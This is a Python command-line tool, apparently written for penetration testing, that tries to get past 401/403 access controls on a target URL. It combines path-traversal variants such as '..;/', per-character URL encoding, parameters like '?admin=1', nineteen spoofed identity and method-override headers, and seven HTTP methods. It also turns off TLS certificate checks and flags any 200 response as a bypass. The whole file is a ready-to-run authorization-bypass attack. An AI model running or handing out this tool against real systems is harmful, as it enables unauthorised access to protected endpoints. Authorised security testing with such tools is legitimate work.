import requests
import argparse
import sys
from urllib.parse import urlparse

# Disable SSL warnings for research/testing environments
requests.packages.urllib3.disable_warnings()

class UltimateBypasser:
    def __init__(self, target_url):
        self.parsed = urlparse(target_url)
        self.base_url = f"{self.parsed.scheme}://{self.parsed.netloc}"
        self.path = self.parsed.path if self.parsed.path else "/"
        self.methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]
        self.successes = []
        self.session = requests.Session()
        self.session.verify = False

    def get_path_variations(self):
        """Generates all recursive segment injections and dynamic encodings."""
        path_str = self.path.strip('/')
        segments = path_str.split('/')
        v = set()
        
        full_path = "/" + path_str
        v.add(full_path)

        # 1. RECURSIVE SEGMENT INJECTION (e.g., /api/..;/v1/users)
        # This handles the specific regex you provided (..;/ at every junction)
        bypass_chars = ["..;/", "..;", ".;/", "./", "//", "/./", "/%2e/"]
        for i in range(len(segments) + 1):
            for char in bypass_chars:
                temp_segs = segments.copy()
                temp_segs.insert(i, char)
                # Fixes potential triple slashes to maintain valid URI structure
                joined = ("/" + "/".join(temp_segs)).replace("//", "/").replace("//", "/")
                v.add(joined)

        # 2. DYNAMIC CHARACTER ENCODING (Per-character URL encoding)
        for i in range(len(full_path)):
            if full_path[i] == '/': continue
            encoded = f"%{ord(full_path[i]):02x}"
            v.add(full_path[:i] + encoded + full_path[i+1:])

        # 3. EXTENSION & TRAILING MUTATIONS
        v.update([
            full_path + "/", 
            full_path + "/.", 
            full_path + "??", 
            full_path + "#",
            full_path + ".json",
            full_path + ".php",
            full_path.upper()
        ])
        
        # 4. QUERY PARAMETER DISCREPANCIES
        for q in ["?method=json", "?debug=true", "?admin=1", "?_method=GET"]:
            v.add(full_path + q)

        return list(v)

    def get_headers(self):
        """The complete list of 19 bypass/identity headers."""
        return [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Host": "127.0.0.1"},
            {"X-Original-URL": self.path},
            {"X-Rewrite-URL": self.path},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"X-ProxyUser-Ip": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"True-Client-IP": "127.0.0.1"},
            {"Cluster-Client-IP": "127.0.0.1"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Forwarded-Proto": "http"},
            {"X-Original-Method": "GET"},
            {"X-HTTP-Method-Override": "GET"},
            {"X-Method-Override": "GET"},
            {"Referer": self.base_url + self.path},
            {"Content-Type": "application/json"}
        ]

    def run(self):
        print(f"[*] Starting Exhaustive Audit: {self.base_url}{self.path}")
        print(f"{'METHOD':<8} | {'CODE':<5} | {'SIZE':<8} | {'PATH VARIATION'}")
        print("-" * 95)

        path_variations = self.get_path_variations()
        headers_to_test = self.get_headers()

        for method in self.methods:
            for p_var in path_variations:
                full_url = self.base_url + p_var
                try:
                    # Baseline Request (Check the path alone first)
                    res = self.session.request(method, full_url, timeout=5, allow_redirects=False)
                    base_status = res.status_code
                    base_size = len(res.content)
                    
                    print(f"{method:<8} | {base_status:<5} | {base_size:<8} | {p_var}")
                    
                    if base_status in [200, 201, 204]:
                        self.successes.append(f"Method: {method} | Path: {p_var} (Direct Success)")

                    # Trigger Header Fuzzing only if blocked
                    if base_status in [401, 403, 405]:
                        for h in headers_to_test:
                            h_res = self.session.request(method, full_url, headers=h, timeout=5, allow_redirects=False)
                            
                            # If the header successfully changes the response to 200 OK
                            if h_res.status_code in [200, 201, 204]:
                                h_name = list(h.keys())[0]
                                print(f"  [!] BYPASS FOUND via {h_name}: {h[h_name]}")
                                self.successes.append(f"Method: {method} | Path: {p_var} | Header: {h}")
                except Exception:
                    continue

    def print_summary(self):
        print("\n" + "="*70)
        print("                   FINAL AUDIT REPORT")
        print("="*70)
        if not self.successes:
            print("[-] No bypasses identified. Target security is robust.")
        else:
            # deduplicate results
            for report in sorted(set(self.successes)):
                print(f"[+] {report}")
        print("="*70)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Master-Grade 403/401 Auditor")
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., https://example.com/api/v1/users)")
    args = parser.parse_args()

    auditor = UltimateBypasser(args.url)
    auditor.run()
    auditor.print_summary()
